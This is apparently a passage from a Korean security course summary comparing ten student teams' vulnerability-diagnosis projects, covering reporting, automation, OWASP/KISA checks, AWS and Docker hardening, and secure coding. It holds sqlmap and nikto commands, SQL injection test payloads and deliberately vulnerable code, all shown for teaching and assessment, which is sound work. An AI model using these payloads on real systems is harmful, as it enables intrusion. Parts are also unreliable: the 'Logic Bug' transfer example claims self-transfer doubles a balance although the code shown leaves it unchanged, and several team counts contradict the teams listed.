| 팀 | 리포팅 도구 | 형식 | 시각화 | 조치 방안 상세도 | 재현 가능성 |
|----|------------|------|--------|-----------------|-----------|
| **10조** | 텍스트 | TXT | 없음 | 중 | 높음 (SQLMap 명령어 포함) |
| **7조** | Streamlit | HTML 대시보드 | 매우 우수 (차트, 그래프) | 높음 | 중 (SAST 결과 포함) |
| **6조** | Excel/HTML | XLSX, HTML | 중 (표, 그래프) | 중 | 중 |
| **3조** | Markdown + PDF | MD, PDF | 중 (Mermaid 다이어그램) | 높음 | 높음 |
| **1조** | Streamlit + AI 리포트 | HTML, Markdown | 우수 (대시보드) | 매우 높음 (AI 생성) | 중 |
| **4조** | Streamlit | HTML | 우수 | 높음 | 중 |
| **5조** | JSON + Markdown | JSON, MD | 중 | 매우 높음 (코드 포함) | 매우 높음 |
| **8조** | JSON + PDF | JSON, PDF | 중 | 중 | 높음 |
| **9조** | PDF (KISA 통합) | PDF | 중 | 높음 (KISA 가이드 참조) | 중 |

**리포팅 트렌드**:
1. **Streamlit 대시보드**: 3개 팀 (7조, 1조, 4조) - 실시간 시각화 및 인터랙티브 분석
2. **PDF 리포트**: 4개 팀 (3조, 8조, 9조) - 공식 문서화 및 배포 용이
3. **JSON 중간 형식**: 8개 팀 - 데이터 저장 및 파싱 용이, 다른 도구와 통합 가능
4. **Markdown**: 4개 팀 - 버전 관리 및 협업 용이

### 7.2.4 진단 자동화 수준 평가

10개 팀의 진단 자동화 수준을 **5단계**로 평가했습니다.

```
Level 5 (완전 자동화): 진단 실행부터 리포트 생성까지 완전 자동화
  └─ 7조 (Stryker AI + Streamlit), 1조 (AI 기반 분석)

Level 4 (고도 자동화): 대부분 자동화, 일부 수동 검증 필요
  └─ 5조 (화이트박스 + 블랙박스 통합), 4조 (Streamlit 스캐너)

Level 3 (중간 자동화): 자동화 스크립트 + 수동 테스트 병행
  └─ 10조 (Kali Linux + 수동), 8조 (SSH 터널링 + 자동 진단), 9조 (SSH 기반 자동 진단)

Level 2 (부분 자동화): 일부 영역만 자동화, 수동 작업 많음
  └─ 6조 (Selenium 자동화), 3조 (Python 스크립트)

Level 1 (수동 중심): 대부분 수동 진단, 자동화 도구 보조적 사용
  └─ (해당 팀 없음)
```

**자동화 구현 방식 비교**:

```python
# Level 5 예시 (7조): 완전 자동화
# 1. 스크립트 실행 하나로 모든 진단 수행
python3 diagnosis_runner.py --target http://lms.com --output dashboard

# 2. 자동으로 SAST + DAST 실행
# 3. 결과 자동 분석 (AI)
# 4. 대시보드 자동 생성 (Streamlit)
# 5. PDF 리포트 자동 생성

# Level 4 예시 (5조): 고도 자동화 + 수동 검증
# 1. 자동화 스크립트 실행
python3 scanner.py --target http://okure.com

# 2. 결과 확인
cat results.json

# 3. 수동 검증 (5가지 취약점)
python3 manual_verification.py --verify sql_injection,xss,csrf

# 4. 리포트 생성
python3 generate_report.py

# Level 3 예시 (10조): 중간 자동화
# 1. Kali Linux 도구 실행 (반자동)
sqlmap -u "..." --batch
nikto -h "..."

# 2. 결과 수동 확인 및 검증
cat sqlmap_results.txt

# 3. 추가 수동 테스트
burpsuite # GUI 도구

# 4. 수동으로 리포트 작성
vi diagnosis_report.txt
```

# Section 7: 통합 학습 및 종합 정리 (Part 2)

## 7.3 핵심 학습 포인트

### 7.3.1 보안 진단 방법론 학습

이번 모듈 프로젝트를 통해 학습한 핵심 보안 진단 방법론을 정리합니다.

#### (1) 체계적인 진단 프로세스의 중요성

**학습 내용**:
10개 팀 모두 공통적으로 **5단계 진단 프로세스** (사전 준비 → 정보 수집 → 취약점 점검 → 결과 분석 → 리포트 생성)를 따랐습니다. 이는 실무 보안 진단에서도 표준적으로 사용되는 방법론입니다.

**실무 적용 시 주의사항**:
```python
# 잘못된 접근: 프로세스 없이 무작위 진단
def wrong_approach():
    # 계획 없이 바로 스캐너 실행
    os.system("sqlmap -u http://target.com/page?id=1")
    os.system("nikto -h http://target.com")
    # 결과 정리 안 함
    # 조치 방안 없음

# 올바른 접근: 체계적인 프로세스
def correct_approach():
    # 1. 사전 준비
    diagnosis_plan = {
        "target": "http://target.com",
        "scope": ["web", "was", "db", "os"],
        "standards": ["OWASP Top 10", "KISA Guide"],
        "tools": ["custom_scanner", "sqlmap", "nikto"],
        "schedule": "2 weeks"
    }

    # 2. 정보 수집
    system_info = collect_system_info(diagnosis_plan["target"])

    # 3. 취약점 점검
    vulnerabilities = run_vulnerability_scan(system_info)

    # 4. 결과 분석
    analyzed_results = analyze_vulnerabilities(vulnerabilities)

    # 5. 리포트 생성
    report = generate_report(analyzed_results)

    return report
```

**강사 피드백 (9조)**:
"진단 프로세스가 명확했고, 5단계로 체계적으로 진행한 점이 우수했습니다. 실무에서도 이런 프로세스를 따르면 빠짐없이 진단할 수 있습니다."

#### (2) 화이트박스와 블랙박스의 균형

**학습 내용**:
- **화이트박스만**: 코드 리뷰로 원인 파악은 가능하지만, 실제 공격 가능 여부는 불확실
- **블랙박스만**: 실제 취약점 발견은 가능하지만, False Positive 많고 근본 원인 파악 어려움
- **그레이박스 (화이트 + 블랙)**: 두 접근의 장점을 결합하여 가장 정확한 진단 가능

**5조 사례 (수동 검증의 중요성)**:
```python
# 화이트박스로 의심 지점 발견
# user_service.py:45
def get_user_by_email(email):
    query = f"SELECT * FROM users WHERE email = '{email}'"  # 의심: SQL Injection 가능
    return db.execute(query)

# 블랙박스로 실제 취약 여부 확인
def verify_sql_injection():
    # 테스트 1: 싱글 쿼트 에러
    response1 = requests.get("http://target.com/api/user?email=test@test.com'")
    if "SQL syntax" in response1.text:
        return "CONFIRMED: Error-based SQL Injection"

    # 테스트 2: 타임베이스 블라인드
    start = time.time()
    requests.get("http://target.com/api/user?email=test@test.com' AND SLEEP(5)--")
    elapsed = time.time() - start

    if elapsed >= 5:
        return "CONFIRMED: Time-based Blind SQL Injection"

    return "FALSE POSITIVE: Not exploitable"

# 결과: 화이트박스에서 의심했던 코드가 실제로 취약함을 블랙박스로 확인
```

**강사 피드백 (5조)**:
"수동 진단으로 자동화 스캐너를 검증한 접근이 매우 우수했습니다. 실제 진단 프로세스에서 필수적인 단계입니다. 자동화 스캐너만 믿으면 오탐이 많아서 반드시 수동 검증이 필요합니다."

#### (3) 진단 기준의 중요성 (OWASP, KISA)

**학습 내용**:
- **OWASP Top 10 2021**: 웹 애플리케이션의 가장 치명적인 10가지 보안 위험
- **KISA 주요정보통신기반시설 취약점 진단 가이드**: 한국 표준 진단 기준 (67개 항목)

**OWASP Top 10 2021 매핑**:
```
A01:2021 – Broken Access Control (접근 제어 실패)
  └─ 구현한 팀: 6조 (IDOR), 3조, 5조, 8조, 9조

A02:2021 – Cryptographic Failures (암호화 실패)
  └─ 구현한 팀: 9조 (세션 관리), 8조, 4조

A03:2021 – Injection (인젝션)
  └─ 구현한 팀: 전체 10개 팀 (SQL Injection, OS Command Injection)

A04:2021 – Insecure Design (안전하지 않은 설계)
  └─ 구현한 팀: 8조 (Logic Bug)

A05:2021 – Security Misconfiguration (보안 구성 오류)
  └─ 구현한 팀: 10조, 9조 (서버 설정), 8조, 1조

A06:2021 – Vulnerable and Outdated Components (취약한 구성요소)
  └─ 구현한 팀: 7조 (플러그인 취약점), 10조

A07:2021 – Identification and Authentication Failures (식별 및 인증 실패)
  └─ 구현한 팀: 9조 (세션 고정), 3조, 5조, 8조

A08:2021 – Software and Data Integrity Failures (소프트웨어 및 데이터 무결성 실패)
  └─ 구현한 팀: 8조 (Logic Bug), 3조

A09:2021 – Security Logging and Monitoring Failures (보안 로깅 및 모니터링 실패)
  └─ 구현한 팀: 1조, 4조, 9조

A10:2021 – Server-Side Request Forgery (SSRF)
  └─ 구현한 팀: 7조, 1조, 8조
```

**KISA 67개 항목 분류**:
```
웹 보안 (20개):
- SQL Injection, XSS, CSRF, 파일 업로드, 디렉터리 리스팅 등

WAS 보안 (15개):
- 세션 관리, 인증/인가, 로그 관리, 에러 처리 등

DB 보안 (17개):
- 계정 관리, 권한 관리, 패스워드 정책, 암호화 등

OS 보안 (15개):
- 계정 관리, 파일 권한, 서비스 관리, 로그 관리 등
```

**7조 사례 (KISA 67개 항목 전체 점검)**:
```python
# KISA 67개 항목 자동 진단 스크립트

KISA_ITEMS = {
    "web": [
        {"id": "W-01", "name": "SQL Injection", "function": check_sql_injection},
        {"id": "W-02", "name": "XSS", "function": check_xss},
        {"id": "W-03", "name": "CSRF", "function": check_csrf},
        # ... 총 20개
    ],
    "was": [
        {"id": "WAS-01", "name": "세션 타임아웃", "function": check_session_timeout},
        {"id": "WAS-02", "name": "세션 고정", "function": check_session_fixation},
        # ... 총 15개
    ],
    "db": [
        {"id": "DB-01", "name": "계정 권한 관리", "function": check_db_privileges},
        {"id": "DB-02", "name": "패스워드 정책", "function": check_password_policy},
        # ... 총 17개
    ],
    "os": [
        {"id": "OS-01", "name": "루트 원격 접속", "function": check_root_remote_login},
        {"id": "OS-02", "name": "SUID/SGID 파일", "function": check_suid_sgid},
        # ... 총 15개
    ]
}

def run_kisa_diagnosis(target, categories=["web", "was", "db", "os"]):
    """KISA 67개 항목 전체 진단"""

    results = {
        "total_items": 0,
        "completed": 0,
        "vulnerable": 0,
        "safe": 0,
        "info": 0,
        "details": []
    }

    for category in categories:
        items = KISA_ITEMS[category]

        for item in items:
            print(f"[진단 중] {item['id']}: {item['name']}")

            try:
                # 진단 함수 실행
                result = item['function'](target)

                results["details"].append({
                    "id": item["id"],
                    "category": category,
                    "name": item["name"],
                    "result": result["status"],  # PASS, FAIL, INFO
                    "evidence": result.get("evidence", ""),
                    "recommendation": result.get("recommendation", "")
                })

                # 통계 업데이트
                if result["status"] == "FAIL":
                    results["vulnerable"] += 1
                elif result["status"] == "PASS":
                    results["safe"] += 1
                else:
                    results["info"] += 1

                results["completed"] += 1

            except Exception as e:
                print(f"[오류] {item['id']} 진단 중 오류: {e}")
                results["details"].append({
                    "id": item["id"],
                    "category": category,
                    "name": item["name"],
                    "result": "ERROR",
                    "evidence": str(e)
                })

            results["total_items"] += 1

    # 진단 완료
    print(f"\n진단 완료: {results['completed']}/{results['total_items']} 항목")
    print(f"취약: {results['vulnerable']}, 양호: {results['safe']}, 정보: {results['info']}")

    return results

# 실행
diagnosis_results = run_kisa_diagnosis("http://lms.com")
```

**강사 피드백 (7조)**:
"KISA 67개 항목을 모두 점검한 것은 매우 체계적이었습니다. 실무에서도 국내 표준인 KISA 가이드를 따르는 것이 중요합니다."

#### (4) 자동화의 중요성과 한계

**학습 내용**:
- **자동화의 장점**: 빠른 진단, 일관성, 반복 가능성
- **자동화의 한계**: False Positive, 비즈니스 로직 취약점 탐지 어려움, 수동 검증 필수

**1조 사례 (AI 활용 자동화)**:
```python
# AI를 활용한 진단 자동화

def ai_based_diagnosis(target_url, target_code):
    """AI가 코드 분석 후 자동으로 테스트 케이스 생성 및 실행"""

    # STEP 1: AI가 코드 분석
    ai_analysis = analyze_code_with_ai(target_code)

    # AI 분석 결과 예시:
    # {
    #     "vulnerabilities": [
    #         {
    #             "type": "SQL Injection",
    #             "location": "user_controller.py:67",
    #             "severity": "HIGH",
    #             "attack_vectors": [
    #                 "admin' OR '1'='1'--",
    #                 "admin' AND SLEEP(5)--"
    #             ]
    #         }
    #     ]
    # }

    # STEP 2: AI가 제안한 페이로드로 자동 테스트
    test_results = []

    for vuln in ai_analysis["vulnerabilities"]:
        print(f"[AI 진단] {vuln['type']} 테스트 중...")

        for payload in vuln["attack_vectors"]:
            response = requests.get(target_url, params={"username": payload})

            # AI가 응답 분석
            is_vulnerable = ai_analyze_response(response.text, vuln["type"])

            test_results.append({
                "vulnerability": vuln["type"],
                "payload": payload,
                "vulnerable": is_vulnerable,
                "evidence": response.text[:200]
            })

    # STEP 3: AI가 리포트 자동 생성
    report = ai_generate_report(test_results)

    return report

def ai_analyze_response(response_text, vuln_type):
    """AI가 응답을 분석하여 취약 여부 판단"""

    prompt = f"""
    다음 HTTP 응답을 분석하여 {vuln_type} 취약점이 있는지 판단해주세요:

    응답 내용:
    {response_text}

    취약한 경우 true, 아닌 경우 false를 반환해주세요.
    """

    response = claude_api.complete(prompt=prompt)

    return "true" in response.lower()

def ai_generate_report(test_results):
    """AI가 진단 결과를 분석하여 리포트 자동 생성"""

    prompt = f"""
    다음 진단 결과를 바탕으로 전문적인 보안 진단 리포트를 작성해주세요:

    진단 결과:
    {json.dumps(test_results, indent=2)}

    리포트 형식:
    1. 진단 요약
    2. 발견된 취약점 상세
    3. 위험도 평가
    4. 조치 방안
    5. 재진단 가이드
    """

    report = claude_api.complete(prompt=prompt)

    return report

# 실행
target_code = open("user_controller.py").read()
report = ai_based_diagnosis("http://target.com/login", target_code)
print(report)
```

**강사 피드백 (1조)**:
"AI를 활용한 자동 분석이 인상적이었습니다. 다만 AI 모델의 정확도 검증이 부족했습니다. AI가 생성한 결과도 반드시 사람이 검증해야 합니다."

**자동화의 한계 사례 (8조 Logic Bug)**:
```python
# Logic Bug는 자동화 스캐너로 탐지하기 매우 어려움

# 취약한 비즈니스 로직 (자동화 도구로 탐지 불가)
@app.route('/transfer', methods=['POST'])
def transfer_money():
    from_account = request.form['from']
    to_account = request.form['to']
    amount = int(request.form['amount'])

    # 취약점: 자기 자신에게 송금 시 잔액이 2배가 됨
    if from_account == to_account:
        # 출금과 입금이 각각 실행되어 잔액이 2배가 됨
        accounts[from_account] -= amount  # 출금
        accounts[to_account] += amount    # 입금 (같은 계정)
        # 결과: 잔액 변화 없음이 아니라, amount만큼 증가
    else:
        accounts[from_account] -= amount
        accounts[to_account] += amount

    return "Transfer completed"

# 자동화 스캐너는 이런 비즈니스 로직 버그를 찾을 수 없음
# 수동으로 코드 리뷰하거나, 실제 송금 테스트를 해야 발견 가능
```

**강사 피드백 (8조)**:
"Logic Bug 구현이 매우 인상적이었습니다. The DAO 해킹 사례를 인용한 것도 좋았습니다. 이런 비즈니스 로직 취약점은 자동화 도구로 찾을 수 없고, 반드시 코드 리뷰와 수동 테스트가 필요합니다."

### 7.3.2 인프라 보안 학습

#### (1) AWS 3-Tier 아키텍처의 보안 설계

**학습 내용**:
대부분의 팀(7개 팀)이 AWS 3-Tier 아키텍처를 구축했으며, 다음과 같은 보안 원칙을 적용했습니다.

**3-Tier 아키텍처 보안 원칙**:


**보안 원칙**:
1. **최소 권한 원칙**: 각 계층은 필요한 포트만 개방
2. **방어 심층화 (Defense in Depth)**: 여러 계층의 보안 장치
3. **네트워크 분리**: Public/Private Subnet 분리
4. **접근 제어**: Security Group을 통한 IP/포트 제어

**4조 사례 (Bastion Host 활용)**:
```python
# Bastion Host를 통한 Private Subnet 접근

import paramiko
from sshtunnel import SSHTunnelForwarder

def access_private_db_via_bastion():
    """Bastion Host를 경유하여 Private DB에 접근"""

    bastion_config = {
        "host": "13.125.xxx.xxx",  # Bastion Host Public IP
        "port": 22,
        "username": "ec2-user",
        "key_file": "/path/to/bastion-key.pem"
    }

    db_config = {
        "host": "192.168.2.10",  # Private DB IP
        "port": 3306,
        "username": "admin",
        "password": "secure_password"
    }

    # SSH 터널 생성
    with SSHTunnelForwarder(
        (bastion_config["host"], bastion_config["port"]),
        ssh_username=bastion_config["username"],
        ssh_pkey=bastion_config["key_file"],
        remote_bind_address=(db_config["host"], db_config["port"])
    ) as tunnel:

        print(f"SSH 터널 생성: localhost:{tunnel.local_bind_port} -> {db_config['host']}:{db_config['port']}")

        # 터널을 통해 DB 연결
        import mysql.connector

        conn = mysql.connector.connect(
            host='127.0.0.1',
            port=tunnel.local_bind_port,
            user=db_config["username"],
            password=db_config["password"]
        )

        cursor = conn.cursor()
        cursor.execute("SELECT user, host FROM mysql.user")

        for user in cursor.fetchall():
            print(f"DB User: {user}")

        conn.close()

# 실행
access_private_db_via_bastion()
```

**강사 피드백 (4조)**:
"Bastion Host 설계가 실무적이었습니다. Private Subnet의 DB와 WAS에 직접 접근하지 않고, Bastion을 경유하는 것이 올바른 보안 설계입니다."

**Security Group 설정 예시 (7조)**:
```yaml
# Security Group 설정 (Terraform)

# 1. Web Server Security Group
resource "aws_security_group" "web" {
  name        = "web-sg"
  description = "Security group for web server"

  # HTTP 허용 (전체 공개)
  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # HTTPS 허용 (전체 공개)
  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # SSH는 특정 IP만 허용
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["123.45.67.89/32"]  # 관리자 IP만
  }

  # 아웃바운드는 모두 허용
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# 2. WAS Security Group
resource "aws_security_group" "was" {
  name        = "was-sg"
  description = "Security group for WAS"

  # 웹 서버로부터만 접근 허용
  ingress {
    from_port       = 8080
    to_port         = 8080
    protocol        = "tcp"
    security_groups = [aws_security_group.web.id]
  }

  # Bastion으로부터 SSH 허용
  ingress {
    from_port       = 22
    to_port         = 22
    protocol        = "tcp"
    security_groups = [aws_security_group.bastion.id]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# 3. DB Security Group
resource "aws_security_group" "db" {
  name        = "db-sg"
  description = "Security group for database"

  # WAS로부터만 접근 허용
  ingress {
    from_port       = 3306
    to_port         = 3306
    protocol        = "tcp"
    security_groups = [aws_security_group.was.id]
  }

  # Bastion으로부터 SSH 허용 (진단용)
  ingress {
    from_port       = 22
    to_port         = 22
    protocol        = "tcp"
    security_groups = [aws_security_group.bastion.id]
  }

  # 외부 접근 차단 (egress만 허용)
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# 4. Bastion Security Group
resource "aws_security_group" "bastion" {
  name        = "bastion-sg"
  description = "Security group for bastion host"

  # SSH는 특정 IP만 허용
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["123.45.67.89/32"]  # 관리자 IP만
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
```

#### (2) SSH 터널링과 보안

**학습 내용**:
Private Subnet의 서버에 안전하게 접근하기 위해 SSH 터널링 기법을 사용했습니다.

**8조 사례 (SSH 터널링 진단 스크립트)**:
```python
# SSH 터널링을 통한 Private Subnet 진단

import paramiko
import xml.etree.ElementTree as ET
from sshtunnel import SSHTunnelForwarder

def parse_server_xml(xml_file):
    """XML 파일에서 서버 정보 파싱"""

    tree = ET.parse(xml_file)
    root = tree.getroot()

    bastion = {
        "ip": root.find("bastion/ip").text,
        "port": int(root.find("bastion/port").text),
        "user": root.find("bastion/user").text,
        "key": root.find("bastion/key").text
    }

    servers = []
    for server in root.findall("servers/server"):
        servers.append({
            "id": server.find("id").text,
            "description": server.find("description").text,
            "category": server.find("category").text,
            "private_ip": server.find("private_ip").text,
            "services": [
                {
                    "name": svc.find("name").text,
                    "port": int(svc.find("port").text)
                }
                for svc in server.findall("services/service")
            ]
        })

    return bastion, servers

def diagnose_server_via_tunnel(bastion, server):
    """SSH 터널링을 통한 서버 진단"""

    results = []

    # Bastion Host에 연결
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(
        bastion["ip"],
        port=bastion["port"],
        username=bastion["user"],
        key_filename=bastion["key"]
    )

    # Private 서버로 SSH 터널 생성
    with SSHTunnelForwarder(
        (bastion["ip"], bastion["port"]),
        ssh_username=bastion["user"],
        ssh_pkey=bastion["key"],
        remote_bind_address=(server["private_ip"], 22)
    ) as tunnel:

        # 터널을 통해 Private 서버에 연결
        private_ssh = paramiko.SSHClient()
        private_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        private_ssh.connect(
            '127.0.0.1',
            port=tunnel.local_bind_port,
            username=bastion["user"],
            key_filename=bastion["key"]
        )

        # 서버 카테고리에 따라 진단 수행
        if server["category"] == "web":
            results.extend(diagnose_web_server(private_ssh))
        elif server["category"] == "application":
            results.extend(diagnose_was_server(private_ssh, server))
        elif server["category"] == "database":
            results.extend(diagnose_db_server(private_ssh, server))

        private_ssh.close()

    ssh_client.close()

    return results

def diagnose_web_server(ssh_client):
    """웹 서버 진단"""

    results = []

    # 1. Nginx 설정 확인
    stdin, stdout, stderr = ssh_client.exec_command("cat /etc/nginx/nginx.conf")
    nginx_config = stdout.read().decode()

    # 디렉터리 리스팅 확인
    if "autoindex on" in nginx_config:
        results.append({
            "item": "디렉터리 리스팅 취약점",
            "result": "FAIL",
            "evidence": "autoindex on",
            "recommendation": "autoindex off 설정"
        })

    # 2. 서버 버전 노출 확인
    if "server_tokens on" in nginx_config or "server_tokens" not in nginx_config:
        results.append({
            "item": "서버 버전 노출",
            "result": "FAIL",
            "evidence": "server_tokens on (또는 미설정)",
            "recommendation": "server_tokens off 설정"
        })

    return results

def diagnose_was_server(ssh_client, server):
    """WAS 서버 진단"""

    results = []

    app_path = server.get("application_path", "/opt/app")

    # 1. 애플리케이션 파일 권한 확인
    stdin, stdout, stderr = ssh_client.exec_command(f"ls -la {app_path}")
    file_list = stdout.read().decode()

    # world-writable 파일 확인
    for line in file_list.split('\n'):
        if 'rwxrwxrwx' in line or 'rw-rw-rw-' in line:
            results.append({
                "item": "파일 권한 취약점",
                "result": "FAIL",
                "evidence": line,
                "recommendation": "파일 권한을 750 이하로 제한"
            })

    # 2. 환경 변수 파일 확인 (.env 등)
    stdin, stdout, stderr = ssh_client.exec_command(f"cat {app_path}/.env 2>/dev/null")
    env_content = stdout.read().decode()

    if env_content and ("PASSWORD" in env_content or "SECRET" in env_content):
        results.append({
            "item": "민감정보 평문 저장",
            "result": "FAIL",
            "evidence": ".env 파일에 패스워드/시크릿 평문 저장",
            "recommendation": "환경 변수 암호화 또는 Secrets Manager 사용"
        })

    return results

def diagnose_db_server(ssh_client, server):
    """DB 서버 진단 (MySQL/MariaDB)"""

    results = []

    db_user = server.get("db_user", "root")
    db_password = server.get("db_password", "")

    # MySQL 접속하여 계정 권한 확인
    mysql_cmd = f"mysql -u {db_user} -p{db_password} -e \"SELECT user, host, Grant_priv, Super_priv FROM mysql.user\""
    stdin, stdout, stderr = ssh_client.exec_command(mysql_cmd)
    user_list = stdout.read().decode()

    # 관리자 권한이 있는 일반 계정 확인
    for line in user_list.split('\n')[1:]:  # 헤더 제외
        if line.strip():
            parts = line.split()
            if len(parts) >= 4:
                user, host, grant_priv, super_priv = parts[0], parts[1], parts[2], parts[3]

                if user != 'root' and (grant_priv == 'Y' or super_priv == 'Y'):
                    results.append({
                        "item": "DB 계정 권한 과다 부여",
                        "result": "FAIL",
                        "evidence": f"{user}@{host} 계정에 Grant 또는 Super 권한 부여",
                        "recommendation": "일반 계정에는 필요한 최소 권한만 부여"
                    })

    return results

# 실행
bastion, servers = parse_server_xml("server_list.xml")

for server in servers:
    print(f"\n[진단 시작] {server['description']} ({server['id']})")
    results = diagnose_server_via_tunnel(bastion, server)

    for result in results:
        print(f"  [{result['result']}] {result['item']}")
```

**강사 피드백 (8조)**:
"SSH 터널링 구현이 실무적이었습니다. XML 서버 정의 방식도 좋았으나, 서버 자동 식별 기능이 추가되면 더 좋을 것 같습니다."

#### (3) Docker 컨테이너 보안

**학습 내용**:
3개 팀(6조, 3조)이 Docker를 활용했으며, 컨테이너 보안의 기본 원칙을 적용했습니다.

**Docker 보안 원칙**:
```dockerfile
# 보안을 고려한 Dockerfile 작성 (3조 사례)

# 1. 최소 권한 이미지 사용 (alpine)
FROM python:3.9-alpine

# 2. 루트가 아닌 사용자로 실행
RUN addgroup -g 1000 appuser && \
    adduser -D -u 1000 -G appuser appuser

# 3. 필요한 패키지만 설치
RUN apk add --no-cache \
    gcc \
    musl-dev \
    postgresql-dev

# 4. 작업 디렉터리 설정
WORKDIR /app

# 5. 의존성 파일 복사 및 설치
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# 6. 애플리케이션 파일 복사
COPY --chown=appuser:appuser . .

# 7. 민감한 파일 제외 (.dockerignore)
# .env, .git, __pycache__ 등

# 8. 사용자 변경 (루트에서 일반 사용자로)
USER appuser

# 9. 포트 노출 (최소한으로)
EXPOSE 5000

# 10. HEALTHCHECK 추가
HEALTHCHECK --interval=30s --timeout=3s \
    CMD wget --quiet --tries=1 --spider http://localhost:5000/health || exit 1

# 11. 애플리케이션 실행
CMD ["python", "app.py"]
```

**docker-compose.yml 보안 설정**:
```yaml
# docker-compose.yml (6조 사례)

version: '3.8'

services:
  web:
    build: ./web
    ports:
      - "80:80"
    networks:
      - frontend
    # 리소스 제한
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 512M
    # 읽기 전용 루트 파일시스템
    read_only: true
    # 임시 파일 시스템 마운트
    tmpfs:
      - /tmp
      - /var/run

  was:
    build: ./was
    networks:
      - frontend
      - backend
    environment:
      - DB_HOST=db
      - DB_PORT=5432
    # 환경 변수 파일 (민감정보 분리)
    env_file:
      - .env.was
    # 보안 옵션
    security_opt:
      - no-new-privileges:true
    # Capabilities 제한
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    deploy:
      resources:
        limits:
          cpus: '1.0'
          memory: 1024M

  db:
    image: postgres:14-alpine
    networks:
      - backend
    volumes:
      # 데이터 영속성
      - db_data:/var/lib/postgresql/data
    environment:
      - POSTGRES_PASSWORD_FILE=/run/secrets/db_password
    # Secrets 사용 (비밀번호 암호화)
    secrets:
      - db_password
    # 보안 옵션
    security_opt:
      - no-new-privileges:true
    deploy:
      resources:
        limits:
          cpus: '1.0'
          memory: 1024M

networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge
    internal: true  # 외부 접근 차단

volumes:
  db_data:

secrets:
  db_password:
    file: ./secrets/db_password.txt
```

**강사 피드백 (6조, 3조)**:
"Docker 보안 설정이 잘 되어 있었습니다. 특히 루트가 아닌 사용자로 실행, 읽기 전용 파일시스템, Secrets 사용 등은 실무 필수 사항입니다."

### 7.3.3 코딩 및 개발 능력 향상

#### (1) 안전한 코딩 패턴 학습

**학습 내용**:
취약점을 직접 구현하고 수정하면서 안전한 코딩 패턴을 학습했습니다.

**SQL Injection 방어 (5조 사례)**:
```java
// 취약한 코드 (Before)
@GetMapping("/user")
public User getUser(@RequestParam String email) {
    String query = "SELECT * FROM users WHERE email = '" + email + "'";
    return jdbcTemplate.queryForObject(query, new UserRowMapper());
}

// 안전한 코드 (After)
@GetMapping("/user")
public User getUser(@RequestParam String email) {
    String query = "SELECT * FROM users WHERE email = ?";
    return jdbcTemplate.queryForObject(query, new Object[]{email}, new UserRowMapper());
}

// 또는 JPA 사용
@GetMapping("/user")
public User getUser(@RequestParam String email) {
    return userRepository.findByEmail(email);  // JPA가 자동으로 Prepared Statement 사용
}
```

**XSS 방어 (3조 사례)**:
```java
// 취약한 코드 (Before)
@GetMapping("/experiment")
public String showExperiment(@RequestParam String dnaSequence, Model model) {
    model.addAttribute("sequence", dnaSequence);  // 이스케이프 없이 출력
    return "experiment";
}

// JSP
<p>${sequence}</p>  <!-- XSS 취약 -->

// 안전한 코드 (After)
@GetMapping("/experiment")
public String showExperiment(@RequestParam String dnaSequence, Model model) {
    // 서버 사이드에서 이스케이프 처리
    String escapedSequence = HtmlUtils.htmlEscape(dnaSequence);
    model.addAttribute("sequence", escapedSequence);
    return "experiment";
}

// 또는 JSP에서 JSTL 사용
<%@ taglib prefix="fn" uri="http://java.sun.com/jsp/jstl/functions" %>
<p>${fn:escapeXml(sequence)}</p>  <!-- JSTL로 이스케이프 -->

// 또는 Thymeleaf 사용 (자동 이스케이프)
<p th:text="${sequence}"></p>  <!-- Thymeleaf가 자동으로 이스케이프 -->
```

**CSRF 방어 (5조 사례)**:
```java
// Spring Security CSRF 토큰 적용

// SecurityConfig.java
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .csrf()
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            .and()
            .authorizeRequests()
                .antMatchers("/api/**").authenticated()
                .anyRequest().permitAll();
    }
}

// 프론트엔드 (React)
import axios from 'axios';

// CSRF 토큰을 쿠키에서 읽어서 요청 헤더에 추가
const getCsrfToken = () => {
    const name = 'XSRF-TOKEN=';
    const decodedCookie = decodeURIComponent(document.cookie);
    const ca = decodedCookie.split(';');

    for (let i = 0; i < ca.length; i++) {
        let c = ca[i].trim();
        if (c.indexOf(name) === 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
};

// API 요청 시 CSRF 토큰 포함
axios.post('/api/data', {
    data: 'some data'
}, {
    headers: {
        'X-XSRF-TOKEN': getCsrfToken()
    }
});
```

**파일 업로드 보안 (10조 사례)**:
```java
// 안전한 파일 업로드 처리

@PostMapping("/upload")
public ResponseEntity<?> uploadFile(@RequestParam("file") MultipartFile file) {

    // 1. 파일 크기 제한 (10MB)
    if (file.getSize() > 10 * 1024 * 1024) {
        return ResponseEntity.badRequest().body("파일 크기는 10MB 이하여야 합니다.");
    }

    // 2. 파일 확장자 화이트리스트 검증
    String originalFilename = file.getOriginalFilename();
    String extension = originalFilename.substring(originalFilename.lastIndexOf(".") + 1).toLowerCase();

    List<String> allowedExtensions = Arrays.asList("jpg", "jpeg", "png", "pdf", "docx");

    if (!allowedExtensions.contains(extension)) {
        return ResponseEntity.badRequest().body("허용되지 않은 파일 형식입니다.");
    }

    // 3. 파일 이름 검증 (경로 조작 방지)
